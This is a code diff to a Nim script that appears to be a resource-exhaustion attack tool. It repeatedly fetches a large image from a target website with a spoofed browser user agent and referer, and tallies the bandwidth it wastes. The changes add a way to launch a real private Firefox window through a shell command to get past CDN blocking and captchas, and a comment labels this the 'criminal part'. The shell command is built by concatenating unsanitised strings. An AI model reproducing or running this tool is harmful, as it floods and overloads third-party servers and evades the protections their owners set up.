@@ -1,9 +1,12 @@
-import asynchttpserver, strutils, httpclient, threadpool, json, asyncdispatch, net, halonium
+import asynchttpserver, strutils, httpclient, threadpool, json, asyncdispatch, net, os, halonium
 
 var imInFight: bool = false
 
 proc inFight(target: string, userAgent: string): void =
+  # this is criminal part
   {.cast(gcsafe).}:
+    runnableExamples:
+      import halonium
     imInFight = true
     let session = createSession(Firefox, browserOptions = %*{
       "moz:firefoxOptions": {
@@ -14,6 +17,9 @@ proc inFight(target: string, userAgent: string): void =
     })
     session.navigate(target)
     imInFight = false
+
+proc inFightP(target: string, filePth: string): void =
+  discard os.execShellCmd("start " & filePth & " -private -url " & target)
 
 proc imgGrb(conType: string, target: string, targetImg: string, userAgent: string, range: int32, referer: string, timeout = 1200, log = false): bool =
   let client = newHttpClient(timeout = timeout)
@@ -78,19 +84,22 @@ var
   targetImg = "/static-assets/image/pages/home/devices/how-it-works/desktop/search-protection-back-dark.png"
   userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0"
   conType = "https://"
+  filePth = "C:/\"Program Files (x86)/Mozilla Firefox\"/firefox.exe" #in winDUSE lol
 
 while true:
-  discard spawn sessionGrb(target, port, range, log = true)
+  #discard spawn sessionGrb(target, port, range, log = true)
   var outPass = spawn imgGrb(conType, target, targetImg, userAgent, bitRange, "https://duckduckgo.com/")
   if ^outPass == true:
     bitWast += bitRange
     echo "Send keep-alive packet to -> " & target & "[" & targetImg & "," & intToStr(bitWast) & "]"
   else:
     if imInFight == false:
-      echo "maybe its blocked by cdn or etc. try solve captcha, js,... by yourself? [y/n]"
+      echo "maybe its blocked by cdn or etc. try solve captcha, js,... by yourself (r for real browser / warn: use custom/rand fingerprint for browser)? [r/y/n]"
       let userInput = stdin.readLine()
       if userInput == "y":
         spawn inFight(conType & target, userAgent)
+      if userInput == "r":
+        spawn inFightP(conType & target, filePth)
       elif userInput == "n":
         discard
 ]#
